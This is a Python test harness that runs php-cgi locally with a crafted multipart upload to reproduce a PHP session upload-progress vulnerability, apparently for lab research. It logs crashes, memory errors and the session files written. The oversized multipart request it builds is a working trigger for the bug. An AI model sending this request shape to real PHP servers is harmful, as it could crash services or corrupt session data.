#!/usr/bin/env python3
"""Single CGI request runner for CVE-2026-109619/109618 upload-progress test.

No network: spawns php-cgi locally with a CGI environment and a multipart body
on stdin, exactly the "same arm shape" used by the mod_php control:
  field PHPSESSID=<sid> + field PHP_SESSION_UPLOAD_PROGRESS=MMM +
  20 file parts, filename F*9 then F*262144 (body ~4.98 MB).
Consumer arm: PHP_SESSION_UPLOAD_PROGRESS + one small file part.
"""
import argparse, hashlib, json, os, re, subprocess, time

BOUNDARY = b"NATIVEOUTPUTEXACT"
FATAL_RE = re.compile(r"(?:PHP )?Fatal error:[^\r\n]*")
OOM_RE = re.compile(r"Allowed memory size of (\d+) bytes exhausted \(tried to allocate (\d+) bytes\)")
ASAN_RE = re.compile(r"(ERROR: AddressSanitizer[^\n]*|SUMMARY: AddressSanitizer[^\n]*|==\d+==ERROR[^\n]*)")


def field(name: bytes, value: bytes) -> bytes:
    return (b"--" + BOUNDARY + b"\r\n"
            + b'Content-Disposition: form-data; name="' + name + b'"\r\n\r\n'
            + value + b"\r\n")


def file_part(index: int, filename: bytes) -> bytes:
    return (b"--" + BOUNDARY + b"\r\n"
            + b'Content-Disposition: form-data; name="upload'
            + str(index).encode() + b'"; filename="' + filename + b'"\r\n'
            + b"Content-Type: application/octet-stream\r\n\r\nX\r\n")


def arm_body(sid: bytes, length: int = 262144, parts: int = 20) -> bytes:
    body = field(b"PHPSESSID", sid)
    body += field(b"PHP_SESSION_UPLOAD_PROGRESS", b"MMM")
    for index in range(parts):
        n = 9 if index == 0 else length
        body += file_part(index, b"F" * n)
    return body + b"--" + BOUNDARY + b"--\r\n"


def tiny_body() -> bytes:
    return (b"--" + BOUNDARY + b"\r\n"
            + b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"'
            b"\r\n\r\nMMM\r\n"
            b"--" + BOUNDARY + b"\r\n"
            + b'Content-Disposition: form-data; name="f"; filename="x"\r\n'
            b"Content-Type: application/octet-stream\r\n\r\nY\r\n"
            + b"--" + BOUNDARY + b"--\r\n")


def sha(b):
    return hashlib.sha256(b).hexdigest()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--binary", required=True)
    ap.add_argument("--label", required=True)
    ap.add_argument("--sid", default="labprobe123")
    ap.add_argument("--mode", choices=["encode", "tiny"], default="encode")
    ap.add_argument("--sessdir", required=True)
    ap.add_argument("--rundir", required=True)
    ap.add_argument("--limit", default="8M")
    ap.add_argument("--cleanup", default="0")
    ap.add_argument("--enabled", default="1")
    ap.add_argument("--display", choices=["stderr", "stdout"], default="stderr")
    ap.add_argument("--asan", action="store_true")
    ap.add_argument("--zend-alloc", choices=["0", "1"], default=None)
    ap.add_argument("--workdir", required=True)
    ap.add_argument("--script", default="index.php")
    ap.add_argument("--error-log", default=None)
    ap.add_argument("--timeout", type=float, default=60.0)
    a = ap.parse_args()

    os.makedirs(a.sessdir, exist_ok=True)
    os.makedirs(a.rundir, exist_ok=True)
    sid = a.sid.encode()
    body = arm_body(sid) if a.mode == "encode" else tiny_body()

    env = {
        "REQUEST_METHOD": "POST",
        "CONTENT_TYPE": "multipart/form-data; boundary=" + BOUNDARY.decode(),
        "CONTENT_LENGTH": str(len(body)),
        "SCRIPT_FILENAME": os.path.join(a.workdir, a.script),
        "SCRIPT_NAME": "/" + a.script,
        "REQUEST_URI": "/" + a.script,
        "QUERY_STRING": "",
        "SERVER_PROTOCOL": "HTTP/1.1",
        "GATEWAY_INTERFACE": "CGI/1.1",
        "REDIRECT_STATUS": "1",
        "SERVER_NAME": "localhost",
        "SERVER_PORT": "80",
        "HTTP_COOKIE": "PHPSESSID=" + a.sid,
        "PATH": os.environ.get("PATH", "/usr/bin:/bin"),
        "HOME": os.environ.get("HOME", "/tmp"),
        "USE_ZEND_ALLOC": (a.zend_alloc if a.zend_alloc is not None else ("0" if a.asan else "1")),
        "ASAN_OPTIONS": "detect_leaks=0:abort_on_error=1:print_stacktrace=1:allocator_may_return_null=1",
    }
    argv = [a.binary, "-n",
            "-d", "session.save_path=" + a.sessdir,
            "-d", "upload_tmp_dir=" + a.sessdir + "/tmp",
            "-d", "sys_temp_dir=" + a.sessdir + "/tmp",
            "-d", "session.upload_progress.enabled=" + a.enabled,
            "-d", "session.upload_progress.cleanup=" + a.cleanup,
            "-d", "session.use_strict_mode=0",
            "-d", "session.use_cookies=1",
            "-d", "session.use_only_cookies=1",
            "-d", "session.gc_probability=0",
            "-d", "display_errors=" + ("stderr" if a.display == "stderr" else "1"),
            "-d", "log_errors=0",
            "-d", "error_reporting=-1",
            "-d", "memory_limit=" + a.limit]
    if a.error_log:
        argv += ["-d", "display_errors=0", "-d", "log_errors=1", "-d", "error_log=" + a.error_log]
    os.makedirs(a.sessdir + "/tmp", exist_ok=True)
    t0 = time.time()
    try:
        p = subprocess.run(argv, input=body, env=env, capture_output=True, timeout=a.timeout)
        rc, out, err, timed = p.returncode, p.stdout, p.stderr, False
    except subprocess.TimeoutExpired as e:
        rc, out, err, timed = "TIMEOUT", e.stdout or b"", e.stderr or b"", True
    dur = round(time.time() - t0, 3)

    with open(os.path.join(a.rundir, "stdout.bin"), "wb") as f:
        f.write(out)
    with open(os.path.join(a.rundir, "stderr.bin"), "wb") as f:
        f.write(err)
    with open(os.path.join(a.rundir, "request.bin"), "wb") as f:
        f.write(body)

    # CGI stdout: headers then blank line then body
    hdr, sep, respbody = out.partition(b"\r\n\r\n")
    if not sep:
        hdr, sep, respbody = out.partition(b"\n\n")
    text_all = (out + b"\n" + err).decode("latin-1")
    fatal = FATAL_RE.findall(text_all)
    oom = OOM_RE.search(text_all)
    asan = ASAN_RE.findall(text_all)

    files = []
    for name in sorted(os.listdir(a.sessdir)):
        pth = os.path.join(a.sessdir, name)
        if not os.path.isfile(pth):
            continue
        data = open(pth, "rb").read()
        with open(os.path.join(a.rundir, "sessfile_" + name + ".bin"), "wb") as f:
            f.write(data)
        files.append({"name": name, "size": len(data), "sha256": sha(data),
                      "head_hex": data[:160].hex(),
                      "head_repr": repr(data[:160])})

    meta = {
        "label": a.label, "binary": a.binary, "sid": a.sid, "mode": a.mode,
        "limit": a.limit, "cleanup": a.cleanup, "enabled": a.enabled,
        "display": a.display, "asan": a.asan, "zend_alloc": env["USE_ZEND_ALLOC"],
        "body_len": len(body), "body_sha256": sha(body),
        "rc": rc, "timed_out": timed, "duration_s": dur,
        "stdout_len": len(out), "stdout_sha256": sha(out),
        "body_only_len": len(respbody), "body_only_sha256": sha(respbody),
        "stderr_len": len(err), "stderr_sha256": sha(err),
        "fatal_lines": fatal, "oom": ({"limit": oom.group(1), "tried": oom.group(2)} if oom else None),
        "asan_lines": asan,
        "session_files": files,
        "stdout_text_head": out[:1200].decode("latin-1"),
        "stderr_text_head": err[:2000].decode("latin-1"),
    }
    with open(os.path.join(a.rundir, "meta.json"), "w") as f:
        json.dump(meta, f, indent=1, sort_keys=True)
    print(json.dumps(meta, sort_keys=True))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
